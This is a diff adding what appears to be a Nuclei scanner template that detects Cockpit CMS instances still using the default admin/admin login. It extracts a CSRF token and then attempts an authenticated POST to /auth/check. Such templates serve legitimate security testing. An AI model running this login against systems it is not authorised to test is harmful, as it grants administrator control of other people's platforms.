@@ -1,0 +1,58 @@
+id: cockpit-default-password
+
+info:
+  name: Cockpit Default Password Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Cockpit is a self-hosted, flexible and user-friendly headless content platform for creating custom digital experiences. The default password vulnerability in Cockpit allows attackers to take control of the entire platform and operate core functions with administrator rights.
+  tags: default-password
+
+flow: http(1) && http(2)
+
+http:
+  - id: csrf-token-retrieval
+    method: GET
+    path:
+      - "{{BaseURL}}/auth/login?to=/"
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "(?i)csfr\\s*:\\s*\\\"(.+?)\\\""
+    extractors:
+      - type: regex
+        part: body
+        name: csrf_token
+        regex:
+          - "(?i)csfr\\s*:\\s*\\\"(.+?)\\\""
+        internal: true
+
+  - id: default-login-check
+    method: POST
+    path:
+      - "{{BaseURL}}/auth/check"
+    headers:
+      Content-Type: application/json
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+    body: |
+      {
+        "auth": {
+          "user": "admin",
+          "password": "admin"
+        },
+        "csfr": "{{csrf_token}}"
+      }
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "\"success\":true"
+      - type: status
+        status:
+          - 200
